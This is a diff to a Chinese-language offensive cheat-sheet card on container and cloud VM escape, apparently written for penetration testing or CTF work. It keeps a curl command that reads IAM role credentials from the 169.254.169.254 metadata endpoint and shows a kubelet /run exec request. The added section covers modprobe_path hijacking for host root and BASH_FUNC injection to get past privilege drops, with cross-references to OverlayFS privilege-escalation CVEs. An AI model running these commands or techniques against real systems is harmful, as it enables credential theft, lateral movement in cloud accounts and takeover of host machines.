@@ -21,6 +21,7 @@ metadata: { domain: linux, tier: T1 }
 [ ] ip a → 是否有 docker0/cni0/flannel 网桥
 [ ] ls /var/run/secrets/kubernetes.io/        # K8s Service Account token
 ```
+→ 非容器沙箱 (snap/flatpak/firejail) → 详见 noncontainer-sandbox-escape 卡
 
 ---
 
@@ -108,6 +109,7 @@ mount | grep -E '/proc|/sys|/var/run|/dev'
 # CVE-2024-21626 (Leaky Vessels): runc WORKDIR fd 泄露 → 宿主机文件访问
 # CVE-2022-0492: cgroup v1 release_agent 无需 CAP_SYS_ADMIN (旧内核未修)
 # CVE-2025-9074: Docker Desktop ≤4.44.2 → 容器内 mount 宿主机资源
+# OverlayFS 内核提权 (CVE-2021-3493 / CVE-2023-0386) → 详见 overlayfs-privesc 卡
 ```
 
 ### 1.7 core_pattern 逃逸 (rw /proc)
@@ -220,20 +222,22 @@ curl -k -XPOST https://<NODE_IP>:10250/run/<NS>/<POD>/<CONTAINER> -d "cmd=id"
 ## 4. Cloud VM 逃逸（元数据 API）
 
 ```
-# AWS IMDSv1
-curl http://169.254.169.254/latest/meta-data/
+# 访问 169.254.169.254 (AWS/GCP/Azure) 元数据端点 → 窃取 IAM 角色凭据 → 横向云资源
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
-
-# AWS IMDSv2 (需要 token)
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
-
-# Azure IMDS
-curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
-
-# GCP
-curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+# GCP: metadata.google.internal · Azure: 需 Metadata:true 头
+（完整见 cloud-attacks 卡）
 ```
+
+---
+
+## CI/模拟云容器逃逸（LocalStack / CodeBuild）
+
+- 特权容器 CAP_SYS_ADMIN 检查：`grep Cap /proc/self/status` 确认 CapEff 含 sys_admin
+- modprobe_path 劫持：写 /proc/sys/kernel/modprobe 指向恶意脚本 → 触发非法 ELF → 宿主机 root
+- entrypoint/gosu 降权绕过：BASH_FUNC 函数注入劫持 `id` 检查（详见 codebuild-floci-escape 卡）
+- docker-java/CodeBuild 容器生命周期：CMD 保活后 docker exec
+
+（完整链见 codebuild-floci-escape 卡；LocalStack 服务滥用面见 aws-attack-surface 卡）
 
 ---
 
